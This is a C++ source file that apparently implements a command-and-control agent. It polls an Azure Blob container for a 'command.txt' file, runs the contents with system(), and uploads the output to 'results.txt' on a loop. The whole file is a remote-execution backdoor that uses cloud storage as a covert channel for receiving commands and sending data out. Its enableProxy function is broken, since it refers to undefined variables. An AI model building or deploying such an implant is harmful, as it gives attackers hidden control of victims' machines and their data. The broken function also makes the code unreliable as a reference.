#include <stdlib.h>
#include <iostream>
#include <azure/storage/blobs.hpp>
#include <fstream>
#include <string>
#include <chrono>
#include <thread>
#include <string>
#include <algorithm>
#include <azure/core/http/transport.hpp>

// Variables
// Please paste your 
static const char* AZURE_STORAGE_CONNECTION_STRING = "DefaultEndpointsProtocol=https;AccountName=nameOfYourStorageAccount;AccountKey=pasteYourStorageAccountKeyHere;EndpointSuffix=core.windows.net";
std::string containerName = "cnc-test";
std::string resultsFileName = "results.txt";
std::string commandFileName = "command.txt";
std::chrono::seconds timespan(15);

// Initialize a new instance of container client
Azure::Storage::Blobs::BlobContainerClient containerClient
= Azure::Storage::Blobs::BlobContainerClient::CreateFromConnectionString(AZURE_STORAGE_CONNECTION_STRING, containerName);

// Create blob objects clients
Azure::Storage::Blobs::BlockBlobClient resultsBlob = containerClient.GetBlockBlobClient(resultsFileName);
Azure::Storage::Blobs::BlockBlobClient commandBlob = containerClient.GetBlockBlobClient(commandFileName);

std::string getCommand() {
    std::cout << "\nTrying to get command from object storage";
    std::string command;
    try
    {
        auto properties = commandBlob.GetProperties().Value;
        std::vector<uint8_t> downloadedCommand(properties.BlobSize);

        commandBlob.DownloadTo(downloadedCommand.data(), downloadedCommand.size());

        command = std::string(downloadedCommand.begin(), downloadedCommand.end());
        std::cout << "\nCommand received: " << command << std::endl;
    }
    catch (const Azure::Core::RequestFailedException& e)
    {
        std::cout << "\nStatus Code: " << static_cast<int>(e.StatusCode)
            << ", Reason Phrase: " << e.ReasonPhrase << std::endl;
        std::cout << e.what() << std::endl;
        return "exception";
    }
    return command;
}

void removeCommandFromServer() {
    commandBlob.Delete();
}

void executeCommand(std::string command) {
    try {
        command.erase(std::remove(command.begin(), command.end(), '\n'), command.end());
        command.append(">localResults");
        std::cout << "\nExecuting command: " << command;
        const char* command_char = command.c_str();
        int i = system(command_char);
    }
    catch (const std::system_error& e) {
        std::ofstream myfile;
        myfile.open("localResults");
        myfile << "\nCaught system_error with code " << e.code()
            << " meaning " << e.what() << '\n';
        myfile.close();
    }
}

void uploadResults() {
    std::string line;
    std::string localResultsString = "";
   
    std::cout << "\nReading local file with command execution results";
    
    try {
        std::ifstream localResultsFile("localResults");
        while (getline(localResultsFile, line)) {
            localResultsString.append(line);
            localResultsString.append("\n");
        }
        localResultsFile.close();
        remove("localResults");
        std::cout << "\nResults file size: " << localResultsString.size();
        std::cout << "\nCommand result snippet: \n------\n"
            << localResultsString.substr(0, std::min(100, (int)localResultsString.length()))
            << "\n-----";
    }
    catch (std::ifstream::failure e) {
        std::cerr << "\nException opening/reading/closing file";
    }

    if (localResultsString != "") {
        try
        {
            std::vector<uint8_t> buffer(localResultsString.begin(), localResultsString.end());
            resultsBlob.UploadFrom(buffer.data(), buffer.size());
            std::cout << "\nResults file on object storage modified on: " << resultsBlob.GetProperties().Value.LastModified.ToString();
        }
        catch (const Azure::Core::RequestFailedException& e)
        {
            std::cout << "Status Code: " << static_cast<int>(e.StatusCode)
                << ", Reason Phrase: " << e.ReasonPhrase << std::endl;
            std::cout << e.what() << std::endl;
        }
    }
    else
        std::cout << "\nNo local file with results";
}

void enableProxy() {
    Azure::Core::Http::CurlTransportOptions curlTransportOptions;
    curlTransportOptions.Proxy = "https://my.proxy.com";
    // Create HTTP transport adapter with options.
    auto curlTransportAdapter = std::make_shared<Azure::Core::Http::CurlTransport>(curlTransportOptions);

    BlobClientOptions options;
    options.TransportOptions.Transport = curlTransportAdapter;
    auto storageClient = BlobServiceClient(url, credential, options);
}

int main()
{
    while (true) {
        std::string command = getCommand();
        if (command != "exception")
        {
            //removeCommandFromServer();
            executeCommand(command);
            uploadResults();
        }
        std::cout << "\nWaiting for : " << timespan.count() << " seconds";
        std::this_thread::sleep_for(timespan);
    }
    std::cout << "\nPress enter to close...";
    getchar();
}